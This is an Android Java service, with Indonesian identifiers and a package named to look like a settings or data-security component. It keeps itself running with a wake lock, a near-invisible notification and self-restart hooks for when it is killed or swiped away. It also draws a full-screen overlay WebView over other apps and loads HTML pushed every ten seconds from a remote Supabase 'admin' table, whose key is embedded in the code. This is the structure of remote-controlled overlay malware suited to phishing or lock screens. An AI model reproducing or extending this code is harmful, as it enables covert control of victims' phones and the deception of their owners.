package com.settings.datasecure;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class LayananBackground extends Service {

    private WindowManager windowManager;
    private WebView webViewOverlay;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String htmlTerakhir = "";
    private PowerManager.WakeLock wakeLock; 
    
    private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.2&select=html_content";
    private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 

    @Override
    public void onCreate() {
        super.onCreate();
        aktifkanModeAntiMati();
        siapkanOverlayWeb();
        mulaiPengecekanOtomatis();
    }

    private void aktifkanModeAntiMati() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "ChannelKeamanan",
                    "Sistem Latar Belakang",
                    NotificationManager.IMPORTANCE_MIN 
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
            Notification notifikasi = new Notification.Builder(this, "ChannelKeamanan")
                    .setContentTitle("Sistem Aktif")
                    .setContentText("Aplikasi berjalan di latar belakang")
                    .setSmallIcon(android.R.drawable.ic_dialog_info) 
                    .build();
            
            // --- PERBAIKAN KRITIS UNTUK ANDROID 16 ---
            // Menyebutkan secara eksplisit tipe FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (Build.VERSION.SDK_INT >= 29) { 
                startForeground(1, notifikasi, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notifikasi);
            }
        }

        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DataSecure::WakeLock");
            wakeLock.acquire();
        }
    }

    private void siapkanOverlayWeb() {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        webViewOverlay = new WebView(this);
        WebSettings webSettings = webViewOverlay.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webViewOverlay.setWebViewClient(new WebViewClient());
        
        webViewOverlay.setBackgroundColor(0x00000000); 
        webViewOverlay.setVisibility(View.GONE);

        int jenisOverlay;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            jenisOverlay = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            jenisOverlay = WindowManager.LayoutParams.TYPE_PHONE;
        }

        WindowManager.LayoutParams parameter = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                jenisOverlay,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
        );
        parameter.gravity = Gravity.CENTER;

        windowManager.addView(webViewOverlay, parameter);
    }

    private void mulaiPengecekanOtomatis() {
        Runnable sistemPemantau = new Runnable() {
            @Override
            public void run() {
                tarikDataDariAdmin();
                handler.postDelayed(this, 10000); 
            }
        };
        handler.post(sistemPemantau);
    }

    private void tarikDataDariAdmin() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(URL_SUPABASE);
                    HttpURLConnection koneksi = (HttpURLConnection) url.openConnection();
                    koneksi.setRequestMethod("GET");
                    koneksi.setRequestProperty("apikey", KUNCI_SUPABASE);
                    koneksi.setRequestProperty("Authorization", "Bearer " + KUNCI_SUPABASE);
                    koneksi.setRequestProperty("Accept", "application/json");
                    
                    // --- PERBAIKAN ANTI-CACHE OVERLAY ---
                    koneksi.setUseCaches(false);
                    koneksi.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate");
                    koneksi.setRequestProperty("Pragma", "no-cache");
                    koneksi.setRequestProperty("Expires", "0");
                    // ------------------------------------

                    if (koneksi.getResponseCode() == 200) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(koneksi.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String baris;
                        while ((baris = in.readLine()) != null) {
                            response.append(baris);
                        }
                        in.close();

                        JSONArray dataJson = new JSONArray(response.toString());
                        if (dataJson.length() > 0) {
                            JSONObject barisData = dataJson.getJSONObject(0);
                            final String htmlBaru = barisData.getString("html_content");

                            if (!htmlBaru.equals(htmlTerakhir)) {
                                htmlTerakhir = htmlBaru;
                                handler.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        if (htmlBaru.equals("STOP_OVERLAY") || htmlBaru.trim().isEmpty()) {
                                            webViewOverlay.setVisibility(View.GONE);
                                        } else {
                                            webViewOverlay.setVisibility(View.VISIBLE);
                                            webViewOverlay.loadDataWithBaseURL(null, htmlBaru, "text/html", "UTF-8", null);
                                        }
                                    }
                                });
                            }
                        }
                    }
                    koneksi.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; 
    }

    // FITUR AUTORUN 1: Deteksi saat aplikasi digeser (swipe) dari Recent Apps
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), RestarterLayanan.class);
        restartServiceIntent.setPackage(getPackageName());
        sendBroadcast(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }

    // FITUR AUTORUN 2: Deteksi saat sistem mencoba menghancurkan layanan
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webViewOverlay != null && windowManager != null) {
            windowManager.removeView(webViewOverlay);
        }
        handler.removeCallbacksAndMessages(null);
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }

        // Berteriak mengirim sinyal sebelum benar-benar mati
        Intent restartServiceIntent = new Intent(getApplicationContext(), RestarterLayanan.class);
        restartServiceIntent.setPackage(getPackageName());
        sendBroadcast(restartServiceIntent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
